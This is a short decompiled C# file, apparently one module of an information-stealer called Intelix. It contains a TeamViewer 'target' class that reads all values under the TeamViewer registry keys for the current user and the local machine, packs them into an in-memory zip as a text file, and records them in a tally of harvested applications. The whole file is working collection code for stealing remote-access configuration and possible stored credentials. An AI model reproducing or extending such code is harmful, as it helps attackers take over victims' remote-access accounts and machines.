using System;
using System.Collections.Generic;
using System.Linq;
using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000053 RID: 83
	public class TeamViewer : ITarget
	{
		// Token: 0x0600010B RID: 267 RVA: 0x0000FB2C File Offset: 0x0000DD2C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\TeamViewer"))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey));
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey2));
			}
			bool flag = list.Any<string>();
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "TeamViewer";
				string text = "TeamViewer\\Registry.txt";
				zip.AddTextFile(text, string.Join("\n", list));
				counterApplications.Files.Add("SOFTWARE\\TeamViewer => " + text);
				counterApplications.Files.Add(text);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
